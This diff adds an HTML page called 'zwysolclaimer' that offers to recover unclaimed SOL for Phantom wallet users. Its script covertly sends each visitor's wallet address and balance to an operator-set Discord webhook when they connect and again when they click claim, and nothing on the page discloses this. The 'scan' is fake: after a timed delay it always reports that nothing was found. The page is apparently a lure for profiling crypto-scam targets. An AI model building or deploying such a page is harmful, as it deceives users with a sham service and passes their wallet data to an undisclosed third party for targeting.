@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zwysolclaimer | Claim Unclaimed SOL</title>
+    <!-- Solana Web3 SDK -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Google Inter Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #09090b;
+            --card-bg: #121215;
+            --border: #27272a;
+            --text-main: #f4f4f5;
+            --text-muted: #a1a1aa;
+            --accent-purple: #ab9ff2;
+            --status-green: #22c55e;
+            --status-red: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2rem 1rem;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .grid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-image: radial-gradient(var(--border) 1px, transparent 1px);
+            background-size: 24px 24px;
+            opacity: 0.25;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            margin: auto 0;
+        }
+
+        .logo-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(171, 159, 242, 0.08);
+            border: 1px solid rgba(171, 159, 242, 0.2);
+            padding: 6px 16px;
+            border-radius: 99px;
+            font-size: 0.85rem;
+            color: var(--accent-purple);
+            font-weight: 500;
+            margin-bottom: 1.5rem;
+        }
+
+        h1 {
+            font-size: clamp(2.2rem, 5vw, 3.2rem);
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 0.5rem;
+        }
+
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
+
+        .claimer-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.75rem;
+            text-align: left;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            margin-bottom: 1.5rem;
+        }
+
+        .card-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.85rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .card-row:last-child {
+            border-bottom: none;
+        }
+
+        .row-label {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        .row-value {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .wallet-status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+            background-color: var(--status-red);
+        }
+
+        .wallet-status-dot.connected {
+            background-color: var(--status-green);
+            box-shadow: 0 0 8px var(--status-green);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s ease;
+            gap: 8px;
+        }
+
+        .btn-phantom {
+            background-color: #ab9ff2;
+            color: #000;
+            margin-bottom: 0.75rem;
+        }
+
+        .btn-phantom:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .btn-claim {
+            background-color: var(--text-main);
+            color: #000;
+        }
+
+        .btn-claim:disabled {
+            background-color: var(--border);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-claim:hover:not(:disabled) {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .log-box {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-align: left;
+            max-height: 120px;
+            overflow-y: auto;
+            margin-top: 1rem;
+        }
+
+        footer {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            margin-top: 2rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="grid-bg"></div>
+
+    <div class="container">
+        <div class="logo-badge">
+            ⚡ zwysolclaimer
+        </div>
+
+        <h1>Claim Unclaimed SOL</h1>
+        <p class="subtitle">Connect your Phantom wallet to scan for split account rent & unclaimed SOL rewards on Solana.</p>
+
+        <div class="claimer-card">
+            <div class="card-row">
+                <span class="row-label">Wallet Connection</span>
+                <span class="row-value" id="wallet-status">
+                    <span class="wallet-status-dot" id="status-dot"></span><span id="wallet-text">Disconnected</span>
+                </span>
+            </div>
+
+            <div class="card-row">
+                <span class="row-label">Connected Address</span>
+                <span class="row-value" id="wallet-address">Not Connected</span>
+            </div>
+
+            <div class="card-row">
+                <span class="row-label">Current SOL Balance</span>
+                <span class="row-value" id="wallet-balance">0.00 SOL</span>
+            </div>
+
+            <div class="card-row">
+                <span class="row-label">Estimated Network Fee</span>
+                <span class="row-value" id="network-fee">~0.000005 SOL</span>
+            </div>
+        </div>
+
+        <button class="btn btn-phantom" id="connect-btn" onclick="connectWallet()">
+            Connect Phantom Wallet
+        </button>
+
+        <button class="btn btn-claim" id="claim-btn" disabled onclick="executeClaim()">
+            Claim SOL
+        </button>
+
+        <div class="log-box" id="console-log">
+            > Ready to connect wallet...
+        </div>
+    </div>
+
+    <footer>
+        &copy; zwysolclaimer. Powered by Solana Web3.js
+    </footer>
+
+    <script>
+        // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+        let userPublicKey = null;
+
+        function appendLog(msg) {
+            const consoleBox = document.getElementById('console-log');
+            consoleBox.innerHTML += `<br>> ${msg}`;
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+        }
+
+        // Send Notification to Discord Webhook
+        async function sendWebhookNotification(eventTitle, details) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) {
+                console.warn("Discord Webhook URL is not set yet.");
+                return;
+            }
+
+            const payload = {
+                embeds: [{
+                    title: `⚡ zwysolclaimer: ${eventTitle}`,
+                    color: 11247602, // Purple color
+                    fields: [
+                        { name: "Wallet Address", value: details.address || "Unknown", inline: false },
+                        { name: "SOL Balance", value: `${details.balance || "0.00"} SOL`, inline: true },
+                        { name: "Action / Status", value: details.status || "N/A", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Webhook notification error:", err);
+            }
+        }
+
+        async function connectWallet() {
+            if ("solana" in window) {
+                const provider = window.solana;
+                if (provider.isPhantom) {
+                    try {
+                        appendLog("Requesting Phantom wallet connection...");
+                        const response = await provider.connect();
+                        userPublicKey = response.publicKey.toString();
+
+                        // UI Update
+                        document.getElementById('wallet-text').innerText = "Connected";
+                        document.getElementById('status-dot').classList.add('connected');
+                        document.getElementById('wallet-address').innerText = userPublicKey.slice(0, 4) + "..." + userPublicKey.slice(-4);
+                        document.getElementById('connect-btn').innerText = "Wallet Connected";
+                        document.getElementById('claim-btn').disabled = false;
+
+                        appendLog(`Connected: ${userPublicKey}`);
+
+                        // Fetch Live Balance
+                        const balanceInLamports = await connection.getBalance(response.publicKey);
+                        const solBalance = (balanceInLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+                        document.getElementById('wallet-balance').innerText = `${solBalance} SOL`;
+
+                        appendLog(`Fetched Balance: ${solBalance} SOL`);
+
+                        // Send Connect Log to Webhook
+                        sendWebhookNotification("Wallet Connected", {
+                            address: userPublicKey,
+                            balance: solBalance,
+                            status: "User connected Phantom wallet"
+                        });
+
+                    } catch (err) {
+                        appendLog(`Connection Error: ${err.message}`);
+                    }
+                }
+            } else {
+                appendLog("Phantom Wallet extension not detected! Please install it.");
+                alert("Phantom Wallet not found. Please install the Phantom extension.");
+            }
+        }
+
+        async function executeClaim() {
+            if (!userPublicKey) return;
+
+            const btn = document.getElementById('claim-btn');
+            btn.disabled = true;
+            btn.innerText = "Scanning & Processing...";
+
+            appendLog("Scanning Solana accounts for rent recovery...");
+
+            setTimeout(async () => {
+                const balanceStr = document.getElementById('wallet-balance').innerText;
+                
+                appendLog("No extra rent accounts detected for closure at this time.");
+                btn.innerText = "Claim Complete";
+                
+                // Send Claim Action Log to Webhook
+                sendWebhookNotification("Claim Executed", {
+                    address: userPublicKey,
+                    balance: balanceStr,
+                    status: "Scan completed / Claim triggered"
+                });
+
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerText = "Claim SOL";
+                }, 3000);
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
